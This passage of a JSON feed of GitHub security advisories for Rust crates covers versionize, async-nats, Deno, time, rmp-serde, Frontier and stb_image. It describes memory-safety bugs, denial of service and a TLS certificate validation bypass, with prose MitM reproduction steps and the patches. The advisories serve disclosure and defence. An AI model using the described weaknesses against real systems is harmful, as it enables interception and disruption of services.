href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-28448\">https://nvd.nist.gov/vuln/detail/CVE-2023-28448</a></li>\n<li><a href=\"https://github.com/firecracker-microvm/versionize/pull/53\">https://github.com/firecracker-microvm/versionize/pull/53</a></li>\n<li><a href=\"https://github.com/firecracker-microvm/versionize/commit/a57a051ba006cfa3b41a0532f484df759e008d47\">https://github.com/firecracker-microvm/versionize/commit/a57a051ba006cfa3b41a0532f484df759e008d47</a></li>\n<li><a href=\"https://github.com/firecracker-microvm/versionize/releases/tag/v0.1.10\">https://github.com/firecracker-microvm/versionize/releases/tag/v0.1.10</a></li>\n<li><a href=\"https://rustsec.org/advisories/RUSTSEC-2023-0030.html\">https://rustsec.org/advisories/RUSTSEC-2023-0030.html</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-8vxc-r5wp-vgvc\">https://github.com/advisories/GHSA-8vxc-r5wp-vgvc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-8vxc-r5wp-vgvc",
            "title": "[versionize] Versionize::deserialize implementation for FamStructWrapper<T> is lacking bound checks, potentially leading to out of bounds memory accesses",
            "date_modified": "2023-03-27T22:03:47.000Z",
            "date_published": "2023-03-24T22:00:05.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-8vxc-r5wp-vgvc"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The NATS official Rust clients are vulnerable to MitM when using TLS.</p>\n<p>The common name of the server's TLS certificate is validated against the <code>host</code>name provided by the server's plaintext <code>INFO</code> message during the initial connection setup phase. A MitM proxy can tamper with the <code>host</code> field's value by substituting it with the common name of a valid certificate it controls, fooling the client into accepting it.</p>\n<h2 id=\"reproduction-steps\">Reproduction steps</h2>\n<ol>\n<li>The NATS Rust client tries to establish a new connection</li>\n<li>The connection is intercepted by a MitM proxy</li>\n<li>The proxy makes a separate connection to the NATS server</li>\n<li>The NATS server replies with an <code>INFO</code> message</li>\n<li>The proxy reads the <code>INFO</code>, alters the <code>host</code> JSON field and passes the tampered <code>INFO</code> back to the client</li>\n<li>The proxy upgrades the client connection to TLS, presenting a certificate issued by a certificate authority present in the client's keychain. In the previous step the <code>host</code> was set to the common name of said certificate</li>\n<li><code>rustls</code> accepts the certificate, having verified that the common name matches the attacker-controlled value it was given</li>\n<li>The client has been fooled by the MitM proxy into accepting the attacker-controlled certificate</li>\n</ol>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/nats-io/nats.rs/commit/817a7b942c462fa9d9938dcb62124173634132fb#diff-767d442397fcaaf2f83e8f924d4a70317a2ce4703a49964d6007707949cfa5f5L303-R304\">https://github.com/nats-io/nats.rs/commit/817a7b942c462fa9d9938dcb62124173634132fb#diff-767d442397fcaaf2f83e8f924d4a70317a2ce4703a49964d6007707949cfa5f5L303-R304</a></li>\n<li><a href=\"https://rustsec.org/advisories/RUSTSEC-2023-0027.html\">https://rustsec.org/advisories/RUSTSEC-2023-0027.html</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-f5v5-ccqc-6w36\">https://github.com/advisories/GHSA-f5v5-ccqc-6w36</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-f5v5-ccqc-6w36",
            "title": "[async-nats] async-nats vulnerable to TLS certificate common name validation bypass",
            "date_modified": "2023-03-24T21:59:54.000Z",
            "date_published": "2023-03-24T21:59:53.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-f5v5-ccqc-6w36"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p><a href=\"https://github.com/tc39/proposal-resizablearraybuffer\">Resizable ArrayBuffers</a> passed to asynchronous native functions that are shrunk during the asynchronous operation could result in an out-of-bound read/write.</p>\n<p>It is unlikely that this has been exploited in the wild, as the only version affected is Deno 1.32.0.</p>\n<p>Deno Deploy users are not affected.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The problem has been resolved by disabling resizable ArrayBuffers temporarily in Deno 1.32.1. Deno 1.32.2 will re-enable resizable ArrayBuffers with a proper fix.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Upgrade to Deno 1.32.1, or run with <code>--v8-flags=--no-harmony-rab-gsab</code> to disable resizable ArrayBuffers.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/denoland/deno/security/advisories/GHSA-c25x-cm9x-qqgx\">https://github.com/denoland/deno/security/advisories/GHSA-c25x-cm9x-qqgx</a></li>\n<li><a href=\"https://github.com/denoland/deno/pull/18395\">https://github.com/denoland/deno/pull/18395</a></li>\n<li><a href=\"https://github.com/denoland/deno/releases/tag/v1.32.1\">https://github.com/denoland/deno/releases/tag/v1.32.1</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-28445\">https://nvd.nist.gov/vuln/detail/CVE-2023-28445</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-c25x-cm9x-qqgx\">https://github.com/advisories/GHSA-c25x-cm9x-qqgx</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-c25x-cm9x-qqgx",
            "title": "[deno_runtime] Deno improperly handles resizable ArrayBuffer",
            "date_modified": "2023-03-24T13:32:17.000Z",
            "date_published": "2023-03-23T23:13:25.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-c25x-cm9x-qqgx"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p><a href=\"https://github.com/tc39/proposal-resizablearraybuffer\">Resizable ArrayBuffers</a> passed to asynchronous native functions that are shrunk during the asynchronous operation could result in an out-of-bound read/write.</p>\n<p>It is unlikely that this has been exploited in the wild, as the only version affected is Deno 1.32.0.</p>\n<p>Deno Deploy users are not affected.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The problem has been resolved by disabling resizable ArrayBuffers temporarily in Deno 1.32.1. Deno 1.32.2 will re-enable resizable ArrayBuffers with a proper fix.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Upgrade to Deno 1.32.1, or run with <code>--v8-flags=--no-harmony-rab-gsab</code> to disable resizable ArrayBuffers.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/denoland/deno/security/advisories/GHSA-c25x-cm9x-qqgx\">https://github.com/denoland/deno/security/advisories/GHSA-c25x-cm9x-qqgx</a></li>\n<li><a href=\"https://github.com/denoland/deno/pull/18395\">https://github.com/denoland/deno/pull/18395</a></li>\n<li><a href=\"https://github.com/denoland/deno/releases/tag/v1.32.1\">https://github.com/denoland/deno/releases/tag/v1.32.1</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-28445\">https://nvd.nist.gov/vuln/detail/CVE-2023-28445</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-c25x-cm9x-qqgx\">https://github.com/advisories/GHSA-c25x-cm9x-qqgx</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-c25x-cm9x-qqgx",
            "title": "[serde_v8] Deno improperly handles resizable ArrayBuffer",
            "date_modified": "2023-03-24T13:32:17.000Z",
            "date_published": "2023-03-23T23:13:25.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-c25x-cm9x-qqgx"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p><a href=\"https://github.com/tc39/proposal-resizablearraybuffer\">Resizable ArrayBuffers</a> passed to asynchronous native functions that are shrunk during the asynchronous operation could result in an out-of-bound read/write.</p>\n<p>It is unlikely that this has been exploited in the wild, as the only version affected is Deno 1.32.0.</p>\n<p>Deno Deploy users are not affected.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The problem has been resolved by disabling resizable ArrayBuffers temporarily in Deno 1.32.1. Deno 1.32.2 will re-enable resizable ArrayBuffers with a proper fix.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Upgrade to Deno 1.32.1, or run with <code>--v8-flags=--no-harmony-rab-gsab</code> to disable resizable ArrayBuffers.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/denoland/deno/security/advisories/GHSA-c25x-cm9x-qqgx\">https://github.com/denoland/deno/security/advisories/GHSA-c25x-cm9x-qqgx</a></li>\n<li><a href=\"https://github.com/denoland/deno/pull/18395\">https://github.com/denoland/deno/pull/18395</a></li>\n<li><a href=\"https://github.com/denoland/deno/releases/tag/v1.32.1\">https://github.com/denoland/deno/releases/tag/v1.32.1</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-28445\">https://nvd.nist.gov/vuln/detail/CVE-2023-28445</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-c25x-cm9x-qqgx\">https://github.com/advisories/GHSA-c25x-cm9x-qqgx</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-c25x-cm9x-qqgx",
            "title": "[Deno] Deno improperly handles resizable ArrayBuffer",
            "date_modified": "2023-03-24T13:32:17.000Z",
            "date_published": "2023-03-23T23:13:25.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-c25x-cm9x-qqgx"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Unix-like operating systems may segfault due to dereferencing a dangling pointer in specific circumstances. This requires an environment variable to be set in a different thread than the affected functions. This may occur without the user's knowledge, notably in a third-party library.</p>\n<p>The affected functions from time 0.2.7 through 0.2.22 are:</p>\n<ul>\n<li><code>time::UtcOffset::local_offset_at</code></li>\n<li><code>time::UtcOffset::try_local_offset_at</code></li>\n<li><code>time::UtcOffset::current_local_offset</code></li>\n<li><code>time::UtcOffset::try_current_local_offset</code></li>\n<li><code>time::OffsetDateTime::now_local</code></li>\n<li><code>time::OffsetDateTime::try_now_local</code></li>\n</ul>\n<p>The affected functions in time 0.1 (all versions) are:</p>\n<ul>\n<li><code>at</code></li>\n<li><code>at_utc</code></li>\n<li><code>now</code></li>\n</ul>\n<p>Non-Unix targets (including Windows and wasm) are unaffected.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>In some versions of <code>time</code>, the internal method that determines the local offset has been modified to always return <code>None</code> on the affected operating systems. This has the effect of returning an <code>Err</code> on the <code>try_*</code> methods and <code>UTC</code> on the non-<code>try_*</code> methods. In later versions, <code>time</code> will attempt to determine the number of threads running in the process. If the process is single-threaded, the call will proceed as its safety invariant is upheld.</p>\n<p>Users and library authors with time in their dependency tree must perform <code>cargo update</code>, which will pull in the updated, unaffected code.</p>\n<p>Users of time 0.1 do not have a patch and must upgrade to an unaffected version: time 0.2.23 or greater or the 0.3 series.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Library authors must ensure that the program only has one running thread at the time of calling any affected method. Binary authors may do the same and/or ensure that no other thread is actively mutating the environment.</p>\n<h3 id=\"references\">References</h3>\n<p><a href=\"https://github.com/time-rs/time/issues/293\">time-rs/time#293</a>.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/time-rs/time/security/advisories/GHSA-wcg3-cvx6-7396\">https://github.com/time-rs/time/security/advisories/GHSA-wcg3-cvx6-7396</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-26235\">https://nvd.nist.gov/vuln/detail/CVE-2020-26235</a></li>\n<li><a href=\"https://github.com/time-rs/time/issues/293\">https://github.com/time-rs/time/issues/293</a></li>\n<li><a href=\"https://rustsec.org/advisories/RUSTSEC-2020-0071.html\">https://rustsec.org/advisories/RUSTSEC-2020-0071.html</a></li>\n<li><a href=\"https://crates.io/crates/time/0.2.23\">https://crates.io/crates/time/0.2.23</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-wcg3-cvx6-7396\">https://github.com/advisories/GHSA-wcg3-cvx6-7396</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-wcg3-cvx6-7396",
            "title": "[time] Segmentation fault in time",
            "date_modified": "2023-03-23T23:05:19.000Z",
            "date_published": "2021-08-25T20:56:46.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-wcg3-cvx6-7396"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>It was found that <code>Raw::from_utf8</code> expects valid UTF-8. If invalid UTF-8 is received it can cause the process to crash.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/3Hren/msgpack-rust/issues/305\">https://github.com/3Hren/msgpack-rust/issues/305</a></li>\n<li><a href=\"https://rustsec.org/advisories/RUSTSEC-2022-0092.html\">https://rustsec.org/advisories/RUSTSEC-2022-0092.html</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-255r-3prx-mf99\">https://github.com/advisories/GHSA-255r-3prx-mf99</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-255r-3prx-mf99",
            "title": "[rmp-serde] `rmp-serde` `Raw` and `RawRef` may crash when receiving invalid UTF-8",
            "date_modified": "2023-03-22T22:21:50.000Z",
            "date_published": "2023-03-22T22:21:49.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-255r-3prx-mf99"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Frontier's <code>modexp</code> precompile uses <code>num-bigint</code> crate under the hood. <a href=\"https://github.com/rust-num/num-bigint/blob/6f2b8e0fc218dbd0f49bebb8db2d1a771fe6bafa/src/biguint/power.rs#L134\">In the implementation</a>, the cases for modulus being even and modulus being odd are treated separately. Odd modulus uses the fast Montgomery multiplication, and even modulus uses the slow plain power algorithm. This gas cost discrepancy was not accounted for in the <code>modexp</code> precompile, leading to possible denial of service attacks.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>No fixes for <code>num-bigint</code> is currently available, and thus this advisory will be first fixed in the short term by raising the gas costs for even modulus, and in the long term fixing it in <code>num-bigint</code> or switching to another modexp implementation.</p>\n<p>The short-term fix for Frontier is deployed at <a href=\"https://github.com/paritytech/frontier/pull/1017\">PR 1017</a>.</p>\n<p>The recommendations are as follows:</p>\n<ul>\n<li>If you anticipate malicious validators, it's recommended to issue an emergency runtime upgrade as soon as possible.</li>\n<li>If you do not anticipate malicious validators, it's recommended to issue a normal runtime upgrade, as Substrate has builtin timeout protection when validators are building blocks.</li>\n</ul>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>None.</p>\n<h3 id=\"references\">References</h3>\n<p>A similar issue was presented in Geth's implementation and the fix can be found <a href=\"https://go-review.googlesource.com/c/go/+/420897\">here</a>.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/paritytech/frontier/security/advisories/GHSA-fcmm-54jp-7vf6\">https://github.com/paritytech/frontier/security/advisories/GHSA-fcmm-54jp-7vf6</a></li>\n<li><a href=\"https://github.com/paritytech/frontier/pull/1017\">https://github.com/paritytech/frontier/pull/1017</a></li>\n<li><a href=\"https://github.com/paritytech/frontier/commit/5af12e94d7dfc8a0208a290643a800f55de7b219\">https://github.com/paritytech/frontier/commit/5af12e94d7dfc8a0208a290643a800f55de7b219</a></li>\n<li><a href=\"https://github.com/rust-num/num-bigint/blob/6f2b8e0fc218dbd0f49bebb8db2d1a771fe6bafa/src/biguint/power.rs#L134\">https://github.com/rust-num/num-bigint/blob/6f2b8e0fc218dbd0f49bebb8db2d1a771fe6bafa/src/biguint/power.rs#L134</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-28431\">https://nvd.nist.gov/vuln/detail/CVE-2023-28431</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-fcmm-54jp-7vf6\">https://github.com/advisories/GHSA-fcmm-54jp-7vf6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-fcmm-54jp-7vf6",
            "title": "[frontier] Frontier's modexp precompile is slow for even modulus",
            "date_modified": "2023-03-22T21:40:47.000Z",
            "date_published": "2023-03-21T22:31:30.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-fcmm-54jp-7vf6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A bug in error handling in the <code>stb_image</code> C library could cause a NULL pointer dereference when attempting to load an invalid or unsupported image file.  This is fixed in version 0.2.5 and later of the <code>stb_image</code> Rust crate, by patching the C code to correctly handle NULL pointers.</p>\n<p>Thank you to GitHub user 0xdd96 for finding and fixing this vulnerability.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/servo/rust-stb-image/pull/102\">https://github.com/servo/rust-stb-image/pull/102</a></li>\n<li><a href=\"https://rustsec.org/advisories/RUSTSEC-2023-0021.html\">https://rustsec.org/advisories/RUSTSEC-2023-0021.html</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-ppjr-267j-5p9x\">https://github.com/advisories/GHSA-ppjr-267j-5p9x</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-ppjr-267j-5p9x",
            "title": "[stb_image] NULL pointer derefernce in `stb_image`",
            "date_modified": "2023-03-20T21:12:09.000Z",
            "date_published": "2023-03-20T21:11:58.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-ppjr-267j-5p9x"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}